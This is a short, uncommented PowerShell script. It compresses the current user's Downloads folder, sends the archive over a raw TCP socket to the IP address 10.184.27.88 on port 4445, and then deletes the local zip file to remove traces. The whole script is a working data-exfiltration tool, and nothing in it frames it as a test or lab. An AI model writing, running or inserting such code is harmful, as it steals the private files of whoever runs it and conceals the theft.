$downloads = "$env:USERPROFILE\Downloads"
$zip = "$env:TEMP\downloads.zip"

Compress-Archive -Path "$downloads\*" -DestinationPath $zip
$client = New-Object System.Net.Sockets.TcpClient("10.184.27.88", 4445)
$stream = $client.GetStream()
$bytes = [System.IO.File]::ReadAllBytes($zip)
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()
$client.Close()
Remove-Item $zip
